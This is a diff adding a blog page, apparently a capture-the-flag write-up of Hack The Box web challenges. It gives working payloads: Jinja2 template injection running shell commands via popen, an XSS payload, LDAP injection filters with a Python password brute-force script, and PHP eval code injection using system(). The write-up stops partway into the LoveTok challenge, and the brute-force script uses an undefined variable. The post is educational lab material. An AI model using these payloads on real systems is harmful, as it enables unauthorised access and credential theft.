@@ -1,0 +1,1067 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/logo.png">
+  <link rel="icon" href="/img/logo.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="14&#x2F;16 active web challenge in total🤠 Nice Quality👍 Templated Can you exploit this simple mistake?   Bet on SSTI. Use Arjun to discover query parameters which may exit. Nothing come out  however">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hack The Box Challenges">
+<meta property="og:url" content="http://example.com/2023/08/05/htb-1/index.html">
+<meta property="og:site_name" content="p4d0rn&#39;s Labyrinth">
+<meta property="og:description" content="14&#x2F;16 active web challenge in total🤠 Nice Quality👍 Templated Can you exploit this simple mistake?   Bet on SSTI. Use Arjun to discover query parameters which may exit. Nothing come out  however">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/..%5Cimg%5Cimage-20230805152815470.png">
+<meta property="og:image" content="http://example.com/..%5Cimg%5Cimage-20230805152731692.png">
+<meta property="og:image" content="http://example.com/..%5Cimg%5Cimage-20230805152917748.png">
+<meta property="og:image" content="e:\MyBook\MyBlog\source\img\image-20230805153545717.png">
+<meta property="og:image" content="http://example.com/..%5Cimg%5Cimage-20230805160039287.png">
+<meta property="og:image" content="http://example.com/..%5Cimg%5Cimage-20230805160606713.png">
+<meta property="og:image" content="http://example.com/..%5Cimg%5Cimage-20230805160924968.png">
+<meta property="og:image" content="http://example.com/..%5Cimg%5Cimage-20230805184256728.png">
+<meta property="og:image" content="http://example.com/..%5Cimg%5Cimage-20230805184425063.png">
+<meta property="og:image" content="http://example.com/img/image-20230807214545751.png">
+<meta property="og:image" content="http://example.com/img/image-20230807215931380.png">
+<meta property="og:image" content="http://example.com/img/image-20230811152803863.png">
+<meta property="og:image" content="http://example.com/img/image-20230811152525427.png">
+<meta property="og:image" content="http://example.com/img/image-20230813161151800.png">
+<meta property="og:image" content="http://example.com/img/image-20230813190709325.png">
+<meta property="og:image" content="http://example.com/img/image-20230814102515912.png">
+<meta property="og:image" content="http://example.com/img/image-20230814103108361.png">
+<meta property="og:image" content="http://example.com/img/image-20230814105347517.png">
+<meta property="og:image" content="http://example.com/img/image-20230814105714999.png">
+<meta property="og:image" content="http://example.com/img/image-20230814111229308.png">
+<meta property="og:image" content="http://example.com/img/image-20230814165246810.png">
+<meta property="og:image" content="http://example.com/img/image-20230814172950058.png">
+<meta property="og:image" content="http://example.com/img/image-20230814160606652.png">
+<meta property="og:image" content="http://example.com/img/image-20230830104922194.png">
+<meta property="og:image" content="http://example.com/img/image-20230830110315086.png">
+<meta property="og:image" content="http://example.com/img/image-20230830110645560.png">
+<meta property="og:image" content="http://example.com/img/image-20230830111228332.png">
+<meta property="og:image" content="http://example.com/img/image-20230830111531362.png">
+<meta property="og:image" content="http://example.com/img/image-20230830111549427.png">
+<meta property="article:published_time" content="2023-08-05T06:35:57.000Z">
+<meta property="article:modified_time" content="2023-09-21T08:15:41.980Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="security">
+<meta property="article:tag" content="ctf">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://example.com/..%5Cimg%5Cimage-20230805152815470.png">
+  
+  
+  
+  <title>Hack The Box Challenges - p4d0rn&#39;s Labyrinth</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.5-a","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>p4d0rn&#39;s labyrinth</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="Hack The Box Challenges"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2023-08-05 14:35" pubdate>
+          2023年8月5日 下午
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          30k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          248 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">Hack The Box Challenges</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <p>14&#x2F;16 active web challenge in total🤠</p>
+<p>Nice Quality👍</p>
+<h1 id="Templated"><a href="#Templated" class="headerlink" title="Templated"></a>Templated</h1><blockquote>
+<p>Can you exploit this simple mistake?</p>
+</blockquote>
+<p><img src="/..%5Cimg%5Cimage-20230805152815470.png" srcset="/img/loading.gif" lazyload alt="image-20230805152815470"></p>
+<p>Bet on SSTI.</p>
+<p>Use <em>Arjun</em> to discover query parameters which may exit. Nothing come out  however. </p>
+<p><img src="/..%5Cimg%5Cimage-20230805152731692.png" srcset="/img/loading.gif" lazyload alt="image-20230805152731692"></p>
+<p>Try to access nonexistent paths hoping it will return some useful error echo.</p>
+<p><img src="/..%5Cimg%5Cimage-20230805152917748.png" srcset="/img/loading.gif" lazyload alt="image-20230805152917748"></p>
+<p>Chances are that this is a SSR 404 Page using templates to render</p>
+<p>Send the common Jinja2 SSTI payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jinja2">&#123;% for c in &#x27;&#x27;.__class__.__mro__[-1].__subclasses__() %&#125;&#123;% if c.__name__ == &#x27;_wrap_close&#x27; %&#125; &#123;&#123;c.__init__.__globals__[&#x27;popen&#x27;](&#x27;cat flag.txt&#x27;).read()&#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;<br></code></pre></td></tr></table></figure>
+
+<p><img src="E:\MyBook\MyBlog\source\img\image-20230805153545717.png" srcset="/img/loading.gif" lazyload alt="image-20230805153545717"></p>
+<h1 id="Phonebook"><a href="#Phonebook" class="headerlink" title="Phonebook"></a>Phonebook</h1><blockquote>
+<p>Who is lucky enough to be included in the phonebook?</p>
+</blockquote>
+<p>A classic Login Page.</p>
+<p><img src="/..%5Cimg%5Cimage-20230805160039287.png" srcset="/img/loading.gif" lazyload alt="image-20230805160039287"></p>
+<p>Try some weak password to login as an admin</p>
+<p>It return the <em>302 Found</em> redirecting to <code>/login?message=Authentication failed</code> for my form submission</p>
+<p>Then I get a message in login page (message from <em>message parameter</em> in URL)</p>
+<p><img src="/..%5Cimg%5Cimage-20230805160606713.png" srcset="/img/loading.gif" lazyload alt="image-20230805160606713"></p>
+<p>Oh, Good! I can try to XSS myself (It’s a DOM XSS)</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">x</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><img src="/..%5Cimg%5Cimage-20230805160924968.png" srcset="/img/loading.gif" lazyload alt="image-20230805160924968"></p>
+<p>Some SQLi attempts also failed.</p>
+<p>After doing some searching, it turns out there is a LDAP injection.</p>
+<p>The Lightweight Directory Access Protocol, or LDAP, is an open  application protocol for accessing and maintaining directory services in an IP network.</p>
+<p>Information about users and resources is stored in a central directory(such as Active Directory)(like a database, but more lightweighted,flexible)</p>
+<p>Applications can access and manipulate the information using LDAP statements</p>
+<p>LDAP statement supports Filters which can be combined using logical and comparison operators and can include wildcards.</p>
+<ul>
+<li><code>(cn=John*)</code> matches entries where the common name starts with <code>John</code> (<code>*</code> matches any character)</li>
+<li><code>(!(cn=*Doe))</code> matches entries where the common name doesn’t end with <code>Doe</code> (<code>!</code> is logical NOT)</li>
+<li><code>(&amp;(cn=J*)(cn=*Doe))</code> matches entries where the common name starts with <code>J</code> and ends with <code>Doe</code> (<code>&amp;</code> is logical AND)</li>
+<li><code>(&amp;(|(cn=John*)(cn=Jane*))(cn=*Doe))</code> matches entries where the common name starts with <code>John</code> or <code>Jane</code> and ends with <code>Doe</code> (<code>|</code> is logical OR)</li>
+</ul>
+<p>Multiple filters and operators are combined using prefix notation (Polish notation), with arguments following the operator.</p>
+<p>There are two typical LDAP injection scenario</p>
+<ul>
+<li>Authentication bypass</li>
+</ul>
+<p>Directory services are commonly used for user authentication and  authorization, so the most basic LDAP injection attacks attempt to  bypass password checking.</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs js">filterContent = <span class="hljs-string">&quot;(&amp;(userID=&quot;</span> + enteredUser + <span class="hljs-string">&quot;)(password=&quot;</span> + <br>  enteredPwd + <span class="hljs-string">&quot;))&quot;</span><br></code></pre></td></tr></table></figure>
+
+<p>an attacker can enter LDAP filter code as the user ID to create a filter that is always true.</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs js">(&amp;(userID=*)(userID=*))(|(userID=*)(password=anything))<br></code></pre></td></tr></table></figure>
+
+<p>This can allow the attacker to gain access without a valid user name or password.</p>
+<ul>
+<li>Information disclosure</li>
+</ul>
+<p>If a vulnerable application uses LDAP filters to provide shared  resources, for example printers, an attacker might inject LDAP filter code to list all resources in the organization’s  directory. Let’s say the following filter intended to list printers and  scanners is assembled in an unsafe way:</p>
+<figure class="highlight clojure"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clojure">(|(<span class="hljs-name">resType=printer</span>)(<span class="hljs-name">resType=scanner</span>))<br></code></pre></td></tr></table></figure>
+
+<p>If the attacker can enter another value instead of printer and knows  that userID is used for user names in the directory, they might inject  the following code:</p>
+<figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-comment">(|(resType=printer)</span><span class="hljs-comment">(userID=*)</span>)<span class="hljs-comment">(resType=scanner)</span>)<br></code></pre></td></tr></table></figure>
+
+<p>This will list all printer and user objects, and the scanner part will be ignored by the server (only the first complete filter is processed).</p>
+<p>Blind injection</p>
+<ul>
+<li>Attribute discovery</li>
+</ul>
+<p>Attackers can query a variety of likely  attributes and monitor server responses. If an attribute exists, the  server will return a valid response. Otherwise, an error or empty  response is returned. Let’s say an application unsafely constructs an  AND filter to retrieve users, such as:</p>
+<figure class="highlight hy"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs hy">(<span class="hljs-name"><span class="hljs-built_in">&amp;</span></span>(<span class="hljs-name">userID=John</span> Doe)(<span class="hljs-name">objectClass=user</span>))<br></code></pre></td></tr></table></figure>
+
+<p>If the attacker can manipulate the user ID value, they can inject  code like the following to check if user objects in this directory have a department attribute:</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">(&amp;(<span class="hljs-attribute">userID</span>=John Doe)(<span class="hljs-attribute">department</span>=*))(objectClass=user))<br></code></pre></td></tr></table></figure>
+
+<p>If the <code>department</code> attribute exists (and <code>John Doe</code> is a valid user ID), the server will return a valid response. Otherwise, the attacker can try other attribute names.</p>
+<ul>
+<li>Booleanization</li>
+</ul>
+<p>Once an attribute name is known, the attacker can send a series of  requests containing wildcards and&#x2F;or comparison operators to determine  specific attribute values. Again, only two server responses are  considered, so booleanization is the process of transforming the search  process into a series of true&#x2F;false tests.</p>
+<p>Let’s say the <code>department</code> attribute from the previous  example exists. To discover the department name, the attacker can start  by injecting the following code to check the first letter:</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">(&amp;(<span class="hljs-attribute">userID</span>=John Doe)(<span class="hljs-attribute">department</span>=a*))(objectClass=user))<br></code></pre></td></tr></table></figure>
+
+<p>A valid server response means that a department starting with the letter “a” exists. The attacker can continue the process for <code>ab*</code>, <code>ac*</code>, and so forth, to discover subsequent characters. For numeric values,  the operators &lt;&#x3D; (less than or equal to) and &gt;&#x3D; (greater than or  equal to) can be used to go through the likely value space.</p>
+<ul>
+<li>Character set reduction</li>
+</ul>
+<p>To minimize the number of requests, attackers can use multiple  wildcards to find out which characters are present anywhere in the  target value. For example, a valid server response for the following  injection:</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">(&amp;(<span class="hljs-attribute">userID</span>=John Doe)(<span class="hljs-attribute">department</span>=*x*))(objectClass=user))<br></code></pre></td></tr></table></figure>
+
+<p>means that a department name containing the letter “x” exists. If an  error or empty response is returned, the attacker can eliminate this  character from the scan. This can greatly reduce the number of requests needed to find the target value.</p>
+<hr>
+<p>Now back to the challenge</p>
+<p>we can try to inject with <code>username=*&amp;password=*</code></p>
+<p>After login, there is a <em>search</em> function</p>
+<p><img src="/..%5Cimg%5Cimage-20230805184256728.png" srcset="/img/loading.gif" lazyload alt="image-20230805184256728"></p>
+<p>we post <code>&#123;&quot;term&quot;:&quot;2&quot;&#125;</code> and it returns below</p>
+<p><img src="/..%5Cimg%5Cimage-20230805184425063.png" srcset="/img/loading.gif" lazyload alt="image-20230805184425063"></p>
+<p>After some fuzzing, I find that the LDAP query structure might be like below(x is your input)</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">(<span class="hljs-attribute">mail</span>=*x*)<br></code></pre></td></tr></table></figure>
+
+<p>Some failure attempts:</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">)<span class="hljs-params">(&amp;(<span class="hljs-attr">password</span>=*)</span><span class="hljs-params">(<span class="hljs-attr">username</span>=*)</span>)<span class="hljs-params">(<span class="hljs-attr">password</span>=</span><br></code></pre></td></tr></table></figure>
+
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">)(password<span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure>
+
+<p>It seems that the server only returns specified fields</p>
+<p>So I turn back to the login page to try the blind injection.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> string<br><br>letters = string.ascii_letters + string.digits + <span class="hljs-string">&#x27;&#123;&#125;-_&#x27;</span><br>pwd = <span class="hljs-string">&quot;&quot;</span><br>url = <span class="hljs-string">&quot;http://157.245.43.189:30629/login&quot;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> letters:<br>    payload = &#123;<br>        <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;*&quot;</span>,<br>        <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">f&quot;*<span class="hljs-subst">&#123;i&#125;</span>*&quot;</span><br>    &#125;<br>    time.sleep(<span class="hljs-number">0.1</span>)<br>    r = requests.post(url, data=payload, allow_redirects=<span class="hljs-literal">False</span>)<br>    location = r.headers[<span class="hljs-string">&#x27;Location&#x27;</span>]<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;failed&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> location:<br>        <span class="hljs-built_in">print</span>(i)<br>        bullet += i<br><br><span class="hljs-built_in">print</span>(bullet)<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> bullet:<br>        payload = &#123;<br>            <span class="hljs-string">&quot;username&quot;</span>: <span class="hljs-string">&quot;*&quot;</span>,<br>            <span class="hljs-string">&quot;password&quot;</span>: <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;pwd + j&#125;</span>*&quot;</span><br>        &#125;<br>        r = requests.post(url, data=payload, allow_redirects=<span class="hljs-literal">False</span>)<br>        location = r.headers[<span class="hljs-string">&#x27;Location&#x27;</span>]<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;failed&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> location:<br>            pwd += j<br>            time.sleep(<span class="hljs-number">5</span>)<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-built_in">print</span>(pwd)<br></code></pre></td></tr></table></figure>
+
+<h1 id="LoveTok"><a href="#LoveTok" class="headerlink" title="LoveTok"></a>LoveTok</h1><blockquote>
+<p>True love is tough, and even harder to find. Once the sun has set, the  lights close and the bell has rung… you find yourself licking your  wounds and contemplating human existence. You wish to have somebody  important in your life to share the experiences that come with it, the  good and the bad. This is why we made LoveTok, the brand new service  that accurately predicts in the threshold of milliseconds when love will come knockin’ (at your door). Come and check it out, but don’t try to  cheat love because love cheats back. 💛</p>
+</blockquote>
+<p>Damn it! I don’t like PHP… Another strange PHP feature</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TimeController</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"><span class="hljs-variable">$router</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable">$format</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;format&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;format&#x27;</span>] : <span class="hljs-string">&#x27;r&#x27;</span>;<br>        <span class="hljs-variable">$time</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">TimeModel</span>(<span class="hljs-variable">$format</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$router</span>-&gt;<span class="hljs-title function_ invoke__">view</span>(<span class="hljs-string">&#x27;index&#x27;</span>, [<span class="hljs-string">&#x27;time&#x27;</span> =&gt; <span class="hljs-variable">$time</span>-&gt;<span class="hljs-title function_ invoke__">getTime</span>()]);<br>    &#125;<br>&#125;<br><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">TimeModel</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$format</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;format = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$format</span>);<br><br>        [ <span class="hljs-variable">$d</span>, <span class="hljs-variable">$h</span>, <span class="hljs-variable">$m</span>, <span class="hljs-variable">$s</span> ] = [ <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">6</span>), <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">23</span>), <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">59</span>), <span class="hljs-title function_ invoke__">rand</span>(<span class="hljs-number">1</span>, <span class="hljs-number">69</span>) ];<br>        <span class="hljs-variable language_">$this</span>-&gt;prediction = <span class="hljs-string">&quot;+$&#123;d&#125; day +$&#123;h&#125; hour +$&#123;m&#125; minute +$&#123;s&#125; second&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getTime</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;$time = date(&quot;&#x27;</span> . <span class="hljs-variable language_">$this</span>-&gt;format . <span class="hljs-string">&#x27;&quot;, strtotime(&quot;&#x27;</span> . <span class="hljs-variable language_">$this</span>-&gt;prediction . <span class="hljs-string">&#x27;&quot;));&#x27;</span>);<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$time</span>) ? <span class="hljs-variable">$time</span> : <span class="hljs-string">&#x27;Something went terribly wrong&#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>Obviously, there is a code injection. But how to bypass <code>addslashes</code> which will escapes specific characters, including single quotes (<code>&#39;</code>), double quotes (<code>&quot;</code>), backslashes (<code>\</code>) by adding a backslash (<code>\</code>) before them.</p>
+<p>So here is a trick.</p>
+<p>In PHP, <code>$&#123;&#125;</code> is a syntax used to access variables within strings. It is called ”curly brace syntax” or ”curly brace variable.”</p>
+<p>The main purpose of <code>$&#123;&#125;</code> is to embed variables within strings. When you need to insert the value of a variable into a string, you can use <code>$&#123;&#125;</code> to enclose the variable. PHP will then replace the <code>$&#123;&#125;</code> and its contents with the value of the variable. <code>$&#123;&#125;</code> can also be used to access elements or properties within arrays and objects. Here’s an example:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;Alice&quot;</span>;<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;My name is $&#123;name&#125;.&quot;</span>;<br><br><span class="hljs-variable">$person</span> = [<br>  <span class="hljs-string">&quot;name&quot;</span> =&gt; <span class="hljs-string">&quot;Bob&quot;</span>,<br>  <span class="hljs-string">&quot;age&quot;</span> =&gt; <span class="hljs-number">30</span><br>];<br><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Name: $&#123;person[&#x27;name&#x27;]&#125;, Age: $&#123;person[&#x27;age&#x27;]&#125; years old.&quot;</span>;<br></code></pre></td></tr></table></figure>
+
+<p><code>$&#123;&#125;</code> is much more powerful and flexible than what described above.</p>
+<p>We can use this trick to make <em>code injection</em> happen.</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$code</span> = <span class="hljs-string">&quot;system(&#x27;calc&#x27;)&quot;</span>;<br><span class="hljs-variable">$evil</span> = <span class="hljs-string">&quot;$&#123;code&#125;;&quot;</span>;<br><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$evil</span>);<br></code></pre></td></tr></table></figure>
+
